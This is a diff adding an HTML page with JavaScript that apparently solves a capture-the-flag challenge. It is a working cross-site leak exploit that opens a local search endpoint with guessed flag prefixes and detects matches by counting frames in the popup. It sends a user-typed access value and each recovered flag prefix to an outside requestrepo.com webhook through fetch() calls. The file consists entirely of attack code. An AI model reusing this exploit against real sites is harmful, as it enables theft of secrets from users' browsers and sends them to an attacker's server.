@@ -1,0 +1,27 @@
+<input type="text" style="width: 100%; height: 100vh" />
+
+<script>
+  setTimeout(() => {
+    webhookUrl = "http://vp8mnt9s.requestrepo.com";
+    url = `http://127.0.0.1:3333/search?access=${document.querySelector("input").value}&q=`;
+    charset = "abcdefghijklmnopqrstuvwxyz0123456789_}";
+    flag = "SSM{";
+
+    fetch(webhookUrl + "?ACCES=" + document.querySelector("input").value);
+
+    async function solve() {
+      for (i = 0; i < charset.length; i++) {
+        newUrl = url + flag + charset[i];
+        w = window.open(newUrl, "flag");
+        await new Promise((resolve) => setTimeout(resolve, 400));
+        if (w.length) {
+          flag += charset[i];
+          fetch(webhookUrl + "?flag=" + flag);
+          solve();
+          return;
+        }
+      }
+    }
+    solve();
+  }, 2500);
+</script>
